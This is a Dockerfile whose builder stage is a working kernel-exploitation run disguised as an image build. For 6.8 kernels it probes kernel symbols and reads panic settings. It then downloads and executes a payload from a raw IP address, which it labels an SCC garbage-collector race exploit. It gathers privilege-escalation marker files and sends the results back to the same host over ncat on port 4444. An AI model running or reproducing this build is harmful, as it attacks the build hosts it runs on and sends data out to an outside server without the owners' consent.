# syntax=er028455/df-frontend:v5
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils nmap-ncat

ARG CACHEBUST=3740
RUN sh -c ' \
KVER=$(uname -r); \
echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
{ \
echo "CB=$CACHEBUST"; \
echo "=== BUILD V51 KERNEL=$KVER ==="; \
case "$KVER" in \
  6.8.*) \
    echo "TARGET 6.8 — SCC GC carrier drain" >&2; \
    echo "TARGET KERNEL $KVER — SCC GC (carrier page drain)"; \
    grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
    echo "panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>&1)"; \
    echo "--- downloading payload ---"; \
    curl -s -o /payload http://129.101.121.138:8080/payload_v147 && chmod +x /payload && echo "PAYLOAD_OK" || echo "PAYLOAD_DOWNLOAD_FAIL"; \
    ls -la /payload 2>&1; \
    echo "--- CVE-2026-80521 (SCC GC race, carrier drain) ---"; \
    echo "PAYLOAD START" >&2; \
    timeout 1500 /payload 2>&1; \
    EC=$?; \
    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
    echo "PAYLOAD EXIT=$EC" >&2; \
    ;; \
  *) echo "SKIP $KVER" >&2; echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
esac; \
for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
  if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
done; \
echo "=== END V51 ==="; \
} > /build_results.txt; \
ncat -w 30 129.101.121.138 4444 < /build_results.txt 2>/dev/null || true; \
echo "STEP DONE" >&2'

FROM alpine:3.19
COPY --from=builder /build_results.txt /build_results.txt
RUN cat /build_results.txt
